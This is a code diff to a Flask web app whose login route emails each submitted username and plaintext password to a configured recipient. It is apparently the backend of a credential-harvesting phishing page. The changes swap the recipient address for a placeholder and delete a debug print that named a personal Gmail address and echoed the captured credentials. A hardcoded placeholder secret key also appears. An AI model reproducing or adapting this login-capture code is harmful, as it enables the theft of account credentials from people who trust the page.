@@ -9,8 +9,7 @@ load_dotenv()
 
 
 app = Flask(__name__)
-app.secret_key = 'your_secret_key' 
-
+app.secret_key = 'your_secret_key'
 # Configure Flask-Mail for sending emails
 app.config["MAIL_SERVER"] = os.getenv("MAIL_SERVER")
 app.config["MAIL_PORT"] = int(os.getenv("MAIL_PORT"))
@@ -35,15 +34,12 @@ def login():
         # Send email with the login attempt details
         msg = Message(
             "Login Attempt Details",
-            recipients=["recipient_email"],  # Your email
+            recipients=["recipient__email(your)"],  # Your email
             body=f"Username: {username}\nPassword: {password}",
         )
 
         try:
             mail.send(msg)
-            print(
-                f"Email sent to vo4685336@gmail.com with username: {username} and password: {password}"
-            )
         except Exception as e:
             print(f"Error sending email: {e}")
 
